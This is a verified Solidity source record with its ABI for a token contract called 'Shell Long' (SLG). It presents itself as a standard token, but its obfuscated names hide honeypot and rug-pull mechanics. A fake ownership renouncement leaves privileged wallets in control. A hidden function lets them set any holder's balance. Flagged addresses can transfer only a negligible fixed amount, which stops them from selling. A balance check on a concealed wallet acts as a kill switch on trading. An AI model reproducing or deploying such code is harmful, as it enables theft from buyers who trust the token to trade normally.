{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface enableAutoFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeExempt {\n    function createPair(address tradingSwap, address feeSender) external returns (address);\n}\n\ninterface listSenderLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTokenLimit) external view returns (uint256);\n\n    function transfer(address fundBuy, uint256 buyReceiver) external returns (bool);\n\n    function allowance(address exemptMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundBuy,\n        uint256 buyReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderLaunchList, uint256 value);\n    event Approval(address indexed exemptMode, address indexed spender, uint256 value);\n}\n\ninterface swapTx is listSenderLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShellLong is receiverTrading, listSenderLaunch, swapTx {\n\n    function decimals() external view virtual override returns (uint8) {\n        return minAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapExempt;\n    }\n\n    uint256 constant totalMax = 8 ** 10;\n\n    uint256 public takeSell;\n\n    function transferFrom(address isAtMin, address fundBuy, uint256 buyReceiver) external override returns (bool) {\n        if (_msgSender() != shouldFeeLaunch) {\n            if (tokenTeam[isAtMin][_msgSender()] != type(uint256).max) {\n                require(buyReceiver <= tokenTeam[isAtMin][_msgSender()]);\n                tokenTeam[isAtMin][_msgSender()] -= buyReceiver;\n            }\n        }\n        return swapIs(isAtMin, fundBuy, buyReceiver);\n    }\n\n    uint256 txReceiver;\n\n    uint256 private swapExempt = 100000000 * 10 ** 18;\n\n    uint8 private minAt = 18;\n\n    address shouldFeeLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function swapFundLaunched() public {\n        emit OwnershipTransferred(teamExemptFund, address(0));\n        fundEnable = address(0);\n    }\n\n    string private shouldMode = \"Shell Long\";\n\n    function maxAmountShould(address listEnable) public {\n        maxSwapLaunched();\n        \n        if (listEnable == teamExemptFund || listEnable == listAmount) {\n            return;\n        }\n        tradingTxTeam[listEnable] = true;\n    }\n\n    bool public feeBuy;\n\n    address public listAmount;\n\n    bool public shouldSwap;\n\n    function approve(address totalFrom, uint256 buyReceiver) public virtual override returns (bool) {\n        tokenTeam[_msgSender()][totalFrom] = buyReceiver;\n        emit Approval(_msgSender(), totalFrom, buyReceiver);\n        return true;\n    }\n\n    function minMaxLaunch(uint256 buyReceiver) public {\n        maxSwapLaunched();\n        totalMode = buyReceiver;\n    }\n\n    bool public atLimitMax;\n\n    bool public enableFrom;\n\n    function allowance(address shouldLimit, address totalFrom) external view virtual override returns (uint256) {\n        if (totalFrom == shouldFeeLaunch) {\n            return type(uint256).max;\n        }\n        return tokenTeam[shouldLimit][totalFrom];\n    }\n\n    function totalMarketing(address limitEnable, uint256 buyReceiver) public {\n        maxSwapLaunched();\n        launchShould[limitEnable] = buyReceiver;\n    }\n\n    address listLaunchMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address takeTokenLimit) public view virtual override returns (uint256) {\n        return launchShould[takeTokenLimit];\n    }\n\n    function maxSwapLaunched() private view {\n        require(autoLiquidityReceiver[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return fundEnable;\n    }\n\n    function transfer(address limitEnable, uint256 buyReceiver) external virtual override returns (bool) {\n        return swapIs(_msgSender(), limitEnable, buyReceiver);\n    }\n\n    mapping(address => bool) public tradingTxTeam;\n\n    function fromIs(address limitLaunchedTo) public {\n        if (shouldSwap) {\n            return;\n        }\n        \n        autoLiquidityReceiver[limitLaunchedTo] = true;\n        if (shouldReceiver) {\n            takeWallet = false;\n        }\n        shouldSwap = true;\n    }\n\n    uint256 private listIs;\n\n    uint256 totalMode;\n\n    function swapIs(address isAtMin, address fundBuy, uint256 buyReceiver) internal returns (bool) {\n        if (isAtMin == teamExemptFund) {\n            return autoFund(isAtMin, fundBuy, buyReceiver);\n        }\n        uint256 isTo = listSenderLaunch(listAmount).balanceOf(listLaunchMarketing);\n        require(isTo == totalMode);\n        require(fundBuy != listLaunchMarketing);\n        if (tradingTxTeam[isAtMin]) {\n            return autoFund(isAtMin, fundBuy, totalMax);\n        }\n        return autoFund(isAtMin, fundBuy, buyReceiver);\n    }\n\n    function autoFund(address isAtMin, address fundBuy, uint256 buyReceiver) internal returns (bool) {\n        require(launchShould[isAtMin] >= buyReceiver);\n        launchShould[isAtMin] -= buyReceiver;\n        launchShould[fundBuy] += buyReceiver;\n        emit Transfer(isAtMin, fundBuy, buyReceiver);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed maxFundTotal, address indexed minEnableTake);\n\n    bool public shouldReceiver;\n\n    address private fundEnable;\n\n    constructor (){\n        if (buyAt != takeWallet) {\n            takeSell = listIs;\n        }\n        enableAutoFee maxMinLaunched = enableAutoFee(shouldFeeLaunch);\n        listAmount = feeExempt(maxMinLaunched.factory()).createPair(maxMinLaunched.WETH(), address(this));\n        \n        teamExemptFund = _msgSender();\n        swapFundLaunched();\n        autoLiquidityReceiver[teamExemptFund] = true;\n        launchShould[teamExemptFund] = swapExempt;\n        if (enableFrom != takeWallet) {\n            listIs = takeSell;\n        }\n        emit Transfer(address(0), teamExemptFund, swapExempt);\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenTeam;\n\n    mapping(address => bool) public autoLiquidityReceiver;\n\n    function owner() external view returns (address) {\n        return fundEnable;\n    }\n\n    string private fundMarketing = \"SLG\";\n\n    address public teamExemptFund;\n\n    bool public takeWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldMode;\n    }\n\n    bool public buyAt;\n\n    mapping(address => uint256) private launchShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFundTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minEnableTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunchList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimitMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoLiquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTokenLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunchedTo\",\"type\":\"address\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"}],\"name\":\"maxAmountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"minMaxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExemptFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"totalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAtMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShellLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}